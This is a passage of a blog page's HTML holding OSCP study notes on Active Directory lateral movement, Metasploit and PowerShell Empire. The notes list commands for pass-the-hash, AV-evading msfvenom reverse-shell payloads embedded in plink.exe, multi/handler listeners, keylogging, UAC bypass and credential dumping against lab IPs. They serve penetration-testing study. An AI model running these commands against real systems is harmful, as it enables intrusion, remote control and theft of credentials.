+<h5 id="Service-Account-Attacks"><a href="#Service-Account-Attacks" class="headerlink" title="Service Account Attacks"></a>Service Account Attacks</h5><p><code>klist</code></p>
+<h5 id="Low-and-Slow-Password-Guessing"><a href="#Low-and-Slow-Password-Guessing" class="headerlink" title="Low and Slow Password Guessing"></a>Low and Slow Password Guessing</h5><p>spray-password.ps1</p>
+<h4 id="Active-Directory-Lateral-Movement"><a href="#Active-Directory-Lateral-Movement" class="headerlink" title="Active Directory Lateral Movement"></a>Active Directory Lateral Movement</h4><h5 id="Pass-the-Hash"><a href="#Pass-the-Hash" class="headerlink" title="Pass the Hash"></a>Pass the Hash</h5><p><code>pth-winexe -U Administrator%xxxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxx //10.11.0.22 cmd</code></p>
+<h5 id="Overpass-the-Hash"><a href="#Overpass-the-Hash" class="headerlink" title="Overpass the Hash"></a>Overpass the Hash</h5><p><code>sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:xxxxxxxxxxxx /run:PowerShell.exe</code></p>
+<h5 id="Pass-the-Ticket"><a href="#Pass-the-Ticket" class="headerlink" title="Pass the Ticket"></a>Pass the Ticket</h5><h5 id="Distributed-Component-Object-Model"><a href="#Distributed-Component-Object-Model" class="headerlink" title="Distributed Component Object Model"></a>Distributed Component Object Model</h5><h4 id="Active-Directory-Persistence"><a href="#Active-Directory-Persistence" class="headerlink" title="Active Directory Persistence"></a>Active Directory Persistence</h4><h5 id="Golden-Tickets"><a href="#Golden-Tickets" class="headerlink" title="Golden Tickets"></a>Golden Tickets</h5><h5 id="Domain-Controller-Synchronization"><a href="#Domain-Controller-Synchronization" class="headerlink" title="Domain Controller Synchronization"></a>Domain Controller Synchronization</h5><h3 id="22-the-Metasploit-framework"><a href="#22-the-Metasploit-framework" class="headerlink" title="22.the Metasploit framework"></a>22.the Metasploit framework</h3><p><code>show -h</code><br><code>services</code>|<code>services -h</code><br><code>db_nmap</code><br><code>hosts</code><br><code>services -p 445</code><br><code>info exploit/windows/http/syncbreeze_bof</code></p>
+<h4 id="Metasploit-payloads"><a href="#Metasploit-payloads" class="headerlink" title="Metasploit payloads"></a>Metasploit payloads</h4><h5 id="Staged-vs-Non-Staged-Payloads"><a href="#Staged-vs-Non-Staged-Payloads" class="headerlink" title="Staged vs Non-Staged Payloads"></a>Staged vs Non-Staged Payloads</h5><p>A non-Staged payload is sent in its entirety along with the exploit.In contrast,a staged payload is usually sent in two parts.The first part contains a small primary payload that causes the victim machine to connect back to the attacker,transfer a larger secondary payload containing the rest of the shellcode,and then execute it.<br>There are several situations in which we would perfer to use staged shellcode in stead of non-staged.</p>
+<ul>
+<li>the vulnerability we are exploiting does not have enough buffer space to hold a full payload</li>
+<li>the staged payload which may pass the antivirus software</li>
+</ul>
+<h5 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h5><p><code>search meterpreter type:payload</code></p>
+<h5 id="experimenting-with-meterpreter"><a href="#experimenting-with-meterpreter" class="headerlink" title="experimenting with meterpreter"></a>experimenting with meterpreter</h5><p><code>help</code><br><code>sysinfo</code><br><code>getuid</code><br><code>upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec</code><br><code>download c:\\Windows\\system32\\calc.exe /tmp/calc.exe</code><br><code>shell</code><br><code>ftp 127.0.0.1</code></p>
+<h5 id="Executable-Payloads"><a href="#Executable-Payloads" class="headerlink" title="Executable Payloads"></a>Executable Payloads</h5><p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.4 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe</code><br>-p is to set the payload<br>-f is to set the output format<br>-o is to specify the output file name<br>-e is to specify the encoder type<br>-i is to set the desired number of encoding iterations<br>-x is to specify the file to inject into<br>or we can generate the payload in msf<br>    use payload&#x2F;windows&#x2F;shell_reverse_tcp<br>    set LHOST 10.11.0.4<br>    set LPORT 443<br>    generate -f exe -e x86&#x2F;shikata_ga_nai -i 9 -x &#x2F;usr&#x2F;share&#x2F;windows-resources&#x2F;binaries&#x2F;plink.exe -o shell_reverse_msf_encoded_embedded.exe&#96;</p>
+<h5 id="Metasploit-Exploit-Multi-Handler"><a href="#Metasploit-Exploit-Multi-Handler" class="headerlink" title="Metasploit Exploit Multi Handler"></a>Metasploit Exploit Multi Handler</h5><p>this moudle works for all single and multi-stage payloads</p>
+<h5 id="Client-Side-Attacks"><a href="#Client-Side-Attacks" class="headerlink" title="Client-Side Attacks"></a>Client-Side Attacks</h5><p><code>msfvenom -l formats</code><br>hta-psh,vba,vba-psh are designed for use in client-side attacks</p>
+<h5 id="Advanced-Features-and-Transports"><a href="#Advanced-Features-and-Transports" class="headerlink" title="Advanced Features and Transports"></a>Advanced Features and Transports</h5><p><code>show advanced</code><br><code>StageEncoder</code><br><code>AutoRunScript</code><br><code>transport list</code></p>
+<pre><code>transport add -t reverse_tcp -l 10.11.0.4 -p 5555
+background
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.11.0.4
+set LPORT 5555
+exploit -j
+sessions -i 5
+transport next
+sessions -i 6
+</code></pre>
+<h4 id="Building-Our-Own-MSF-Moudle"><a href="#Building-Our-Own-MSF-Moudle" class="headerlink" title="Building Our Own MSF Moudle"></a>Building Our Own MSF Moudle</h4><h4 id="Post-Exploitation-with-Metasploit"><a href="#Post-Exploitation-with-Metasploit" class="headerlink" title="Post-Exploitation with Metasploit"></a>Post-Exploitation with Metasploit</h4><h5 id="Core-Post-Exploitation-Features"><a href="#Core-Post-Exploitation-Features" class="headerlink" title="Core Post-Exploitation Features"></a>Core Post-Exploitation Features</h5><p><code>screenshot</code><br><code>keyscan_start</code>—<code>keyscan_dump</code>—<code>keyscan_stop</code></p>
+<h5 id="Migrating-Processes"><a href="#Migrating-Processes" class="headerlink" title="Migrating Processes"></a>Migrating Processes</h5><p><code>ps</code>—&gt;<code>migrate 3586</code></p>
+<h5 id="Post-Exploitation-Modules"><a href="#Post-Exploitation-Modules" class="headerlink" title="Post-Exploitation Modules"></a>Post-Exploitation Modules</h5><p><code>use exploit/windows/local/bypassuac_injection_winsxs</code>—&gt;<code>load powershell</code>—&gt;<code>help powershell</code>—&gt;<code>powershell_execute &quot;$PSVersionTable.PSVersion&quot;</code>—&gt;<code>load kiwi</code>—&gt;<code>getsystem</code>—&gt;<code>creds_msv</code></p>
+<h5 id="Pivoting-with-the-Metasploit-Framework"><a href="#Pivoting-with-the-Metasploit-Framework" class="headerlink" title="Pivoting with the Metasploit Framework"></a>Pivoting with the Metasploit Framework</h5><h4 id="Metasploit-Automation"><a href="#Metasploit-Automation" class="headerlink" title="Metasploit Automation"></a>Metasploit Automation</h4><h2 id="setup-rc"><a href="#setup-rc" class="headerlink" title="setup.rc"></a>setup.rc</h2><pre><code>use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 10.11.0.4
+set LPORT 443
+set EnableStageEncoding true
+set StageEncoder x86/shikata_ga_nai
+set AutoRunScript post/windows/manage/migrate
+set ExitOnSession false
+exploit -j -z
+</code></pre>
+<p>msfconsole -r setup.rc</p>
+<h3 id="23-powershell-empire"><a href="#23-powershell-empire" class="headerlink" title="23.powershell empire"></a>23.powershell empire</h3><h4 id="Installation-Setup-and-Usage"><a href="#Installation-Setup-and-Usage" class="headerlink" title="Installation,Setup,and Usage"></a>Installation,Setup,and Usage</h4><p><code>git clone https://github.com/PowerShellEmpire/Empire.git</code><br><code>./setup/install.sh</code><br><code>./empire</code><br><code>help</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/28/oscp/" data-id="cl7edtt4f000gjtcp7kom3gam" data-title="oscp" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/08/28/Devel/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Devel
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/27/Irked/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Irked</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/08/30/Networked/">Networked</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/29/Buff/">Buff</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/29/Arctic/">Arctic</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/28/Devel/">Devel</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/28/oscp/">oscp</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
